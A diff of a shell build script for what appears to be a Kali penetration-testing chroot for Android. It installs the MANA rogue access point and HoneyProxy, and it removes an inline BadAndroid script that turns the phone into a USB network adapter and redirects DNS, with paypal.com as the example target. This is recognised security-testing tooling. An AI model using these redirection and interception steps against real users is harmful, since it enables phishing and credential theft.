@@ -281,7 +281,13 @@ if [ $LOCALGIT == 1 ]; then
 fi
 
 # Copy over helper files to chroot /usr/bin
-cp -rf ${basepwd}/../utils/{k-*,s,mana} kali-$architecture/usr/bin/
+
+# Install Local files
+mkdir -p kali-$architecture/opt/badandroid/tmp
+
+cp -rf ${basepwd}/../utils/hid/* kali-$architecture/usr/bin/
+cp -rf ${basepwd}/../utils/badusb/* kali-$architecture/opt/badandroid/tmp/
+
 
 cat << EOF > kali-$architecture/etc/network/interfaces
 auto lo
@@ -380,13 +386,13 @@ else
         git clone https://github.com/sensepost/mana.git ${basedir}/kali-$architecture/opt/mana
 fi
 
+cp -rf ${basepwd}/../utils/manna/mana ${basedir}/kali-$architecture/usr/bin/
+cp -rf ${basepwd}/../utils/manna/start-nat-full-mod.sh ${basedir}/kali-$architecture/opt/mana/run-mana/
+
 cp -rf ${basedir}/kali-$architecture/opt/mana/apache/etc/apache2/sites-available/* ${basedir}/kali-$architecture/etc/apache2/sites-available
 cp -rf ${basedir}/kali-$architecture/opt/mana/apache/etc/apache2/sites-enabled/* ${basedir}/kali-$architecture/etc/apache2/sites-enabled
 cp -rf ${basedir}/kali-$architecture/opt/mana/apache/var/www/* ${basedir}/kali-$architecture/var/www
 cp ${basedir}/kali-$architecture/opt/mana/hostapd-manna/hostapd/defconfig ${basedir}/kali-$architecture/opt/mana/hostapd-manna/hostapd/.config
-
-cp -rf ${basepwd}/../utils/start-nat-full-mod.sh ${basedir}/kali-$architecture/opt/mana/run-mana/
-chmod 755 ${basedir}/kali-$architecture/opt/mana/run-mana/
 
 # Make Hostapd Binary
 LANG=C chroot kali-$architecture make -C /opt/mana/hostapd-manna/hostapd/
@@ -404,80 +410,6 @@ cat << EOF > ${basedir}/kali-$architecture/opt/honeyproxy/default.conf
 --dump-dir /captures/honeyproxy/
 -T
 #-p port
-EOF
-
-# Install BadAndroid
-mkdir -p kali-$architecture/opt/badandroid/tmp
-cat << EOF > kali-$architecture/opt/badandroid/bad.sh
-# Modified from BadAndroid v0.1 to work inside Kali chroot
-# Developed by Jakob Lell <jakob@srlabs.de> of srlabs.de
-#!/bin/sh
-TMPDIR=/opt/badandroid/tmp
-UPSTREAM_NS=8.8.8.8
-BADANDROID_DIR=$TMPDIR/badusb
-INTERFACE=usb0
-# Check required tools
-if ! test -e /sys/class/android_usb/android0/f_rndis;then
-    echo "Device doesn't support RNDIS"
-    exit 1
-fi
-if ! test -e /opt/badandroid/tmp/hosts;then
-    echo "Please add a hosts file for your redirects to /data/local/tmp/hosts"
-    exit 1
-fi
-if test -e $BADANDROID_DIR;then
-    sh /opt/badandroid/cleanup.sh
-fi
-mkdir $BADANDROID_DIR
-chmod 755 $BADANDROID_DIR
-cd $BADANDROID_DIR
-# Use mount --bind to hide the contents of /sys/class/android_usb and /sys/devices/virtual/android_usb so that the android 
-# system can't reconfigure the USB interface any more (until the next reboot)
-mkdir $BADANDROID_DIR/empty
-mkdir $BADANDROID_DIR/sys_class_android_usb
-mkdir $BADANDROID_DIR/sys_devices_virtual_android_usb
-echo "Disabling usb interface before reconfiguring..."
-# We have to disable the usb interface before reconfiguring it
-echo 0 > /sys/devices/virtual/android_usb/android0/enable
-echo rndis > /sys/devices/virtual/android_usb/android0/functions
-echo 224 > /sys/devices/virtual/android_usb/android0/bDeviceClass
-echo 6863 > /sys/devices/virtual/android_usb/android0/idProduct
-echo 1 > /sys/devices/virtual/android_usb/android0/enable
-# Check whether it has applied the changes
-ifconfig $INTERFACE up
-# Wait until the interface actually exists
-while ! ifconfig $INTERFACE > /dev/null 2>&1;do
-    echo Waiting for interface $INTERFACE
-    sleep 1
-done
-# Configure interface, firewall and packet forwarding
-echo "Bringing ${INTERFACE} up and setting iptables"
-ifconfig $INTERFACE inet 192.168.100.1 netmask 255.255.255.0 up
-iptables -I FORWARD -i $INTERFACE -j ACCEPT
-iptables -t nat -A POSTROUTING -j MASQUERADE
-echo 1 > /proc/sys/net/ipv4/ip_forward
-chmod 644 /opt/badandroid/hosts
-# Start dnsmasq
-dnsmasq -H /opt/badandroid/hosts -i $INTERFACE -R -S $UPSTREAM_NS -F 192.168.100.100,192.168.100.200 -x $BADANDROID_DIR/dnsmasq.pid
-EOF
-
-cat << EOF > kali-$architecture/opt/badandroid/hosts
-# THIS IS AN EXAMPLE HOST FILE, MODIFY DNS ENTRIES
-1.2.3.4 paypal.com www.paypal.com
-EOF
-
-cat << EOF > kali-$architecture/opt/badandroid/cleanup.sh
-#!/bin/sh
-BADANDROID_DIR=/opt/badandroid/tmp/badusb
-busybox killall dnsmasq
-busybox umount /sys/class/android_usb/
-busybox umount /sys/devices/virtual/android_usb/
-busybox umount $BADANDROID_DIR/sys_class_android_usb/
-busybox umount $BADANDROID_DIR/sys_devices_virtual_android_usb/
-busybox rm -r $BADANDROID_DIR
-echo 0 > /sys/class/android_usb/android0/enable
-echo mtp,adb > /sys/class/android_usb/android0/functions
-echo 1 > /sys/class/android_usb/android0/enable
 EOF
 
 # Install Spiderfoot
